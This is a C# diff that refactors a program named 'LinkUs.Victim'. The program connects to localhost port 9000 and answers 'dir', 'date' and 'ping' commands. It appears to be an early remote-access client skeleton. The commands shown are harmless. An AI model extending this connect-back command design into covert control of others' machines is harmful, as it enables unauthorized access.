@@ -10,54 +10,40 @@ namespace LinkUs.Victim
     class Program
     {
         static readonly UTF8Encoding Encoding = new UTF8Encoding();
-        private static AsyncConnection _connection;
 
         static void Main(string[] args)
         {
-            var tcpClient = new TcpClient();
-            tcpClient.BeginConnect("127.0.0.1", 9000, ClientConnected, tcpClient);
+            var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            socket.Connect("127.0.0.1", 9000);
+
+            var connection = new SocketConnection(socket);
+            var connector = new PackageConnector(connection);
+            connector.PackageReceived += (sender, package) => {
+                ProcessCommand(connector, package);
+            };
+
+            Console.WriteLine("* Connected to client.");
             while (Console.ReadLine() != "exit") { }
-            tcpClient.Close();
+            connector.Close();
         }
 
-        private static void ClientConnected(IAsyncResult result)
+        private static void ProcessCommand(PackageConnector connector, Package package)
         {
-            var tcpClient = (TcpClient) result.AsyncState;
-            tcpClient.EndConnect(result);
-            if (tcpClient.Connected) {
-                Console.WriteLine("* Connected to client.");
-                _connection = new AsyncConnection(tcpClient);
-                _connection.DataReceived += ConnectionOnDataReceived;
-                _connection.StartReceiving();
-            }
-            else {
-                Console.WriteLine("* Trying to connect...");
-                tcpClient.BeginConnect("127.0.0.1", 9000, ClientConnected, tcpClient);
-            }
-        }
+            Console.WriteLine(package);
 
-        private static void ConnectionOnDataReceived(byte[] data)
-        {
-            var package = Package.Parse(data);
-            Console.WriteLine($"* package received : {package}");
-            ProcessCommand(package);
-        }
-
-        private static void ProcessCommand(Package package)
-        {
             var command = Encoding.GetString(package.Content);
             if (command == "dir") {
                 Thread.Sleep(1000);
                 var packageResponse = package.CreateResponsePackage(Encoding.GetBytes(Directory.GetCurrentDirectory()));
-                _connection.SendAsync(packageResponse.ToByteArray());
+                connector.Send(packageResponse);
             }
             else if (command == "date") {
                 var packageResponse = package.CreateResponsePackage(Encoding.GetBytes(DateTime.Now.ToShortDateString()));
-                _connection.SendAsync(packageResponse.ToByteArray());
+                connector.Send(packageResponse);
             }
             else if (command == "ping") {
                 var packageResponse = package.CreateResponsePackage(Encoding.GetBytes("ok"));
-                _connection.SendAsync(packageResponse.ToByteArray());
+                connector.Send(packageResponse);
             }
         }
     }
